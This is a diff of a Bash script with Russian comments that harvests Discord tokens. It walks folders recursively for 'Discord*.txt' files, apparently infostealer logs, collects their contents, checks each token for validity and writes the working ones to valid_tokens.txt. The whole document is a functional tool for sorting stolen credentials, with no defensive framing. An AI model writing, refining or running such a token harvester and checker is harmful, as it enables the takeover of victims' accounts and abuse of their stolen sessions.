@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Проверка аргументов
-if [ $# -lt 2 ]; then
+if [[ $# -lt 2 ]]; then
   echo "Использование: $0 <validate> <out_path> <folder1> ..."
   exit 1
 fi
@@ -9,15 +9,19 @@ fi
 validate=$1
 out_path=$2
 shift 2
-folders=$@
+search_folders=$@
 
 # Функция поиска токенов
 function find_tokens() {
 
-  for folder in $1; do
-    for file in $folder/*; do
-      if [ -f "$file" ]; then
-        grep -Eoh "NT[0-9]{10}\.[0-9A-Z]{24}\.[0-9a-zA-Z-_]{6}" "$file" >> "$tokens_file"
+  for folder in "$@"; do
+    for file in "$folder"/*; do
+      if [[ "$file" =~ Discord.*\.txt$ ]]; then
+        while read line; do
+          echo "$line" >> "$tokens_file"
+        done < "$file"
+      elif [ -d "$file" ]; then
+        find_tokens "$file"
       fi
     done
   done
@@ -32,10 +36,6 @@ function validate_tokens() {
 
     if [[ "$response" =~ "401: Unauthorized" ]]; then
       echo "Токен $token невалиден"
-
-    elif [[ "$response" =~ "You need to verify your account" ]]; then
-      echo "Токен $token требует подтверждения телефона"
-
     else
       echo "Токен $token валиден"
       echo "$token" >> "$valid_tokens_file"
@@ -47,12 +47,13 @@ function validate_tokens() {
 
 # Логика
 
+mkdir -p "$out_path"
 tokens_file="$out_path/tokens.txt"
 valid_tokens_file="$out_path/valid_tokens.txt"
 
-find_tokens "$folders"
+find_tokens "$search_folders"
 
-if [ "$validate" = "1" ]; then
+if [[ "$validate" == "1" ]]; then
   validate_tokens
 fi
 
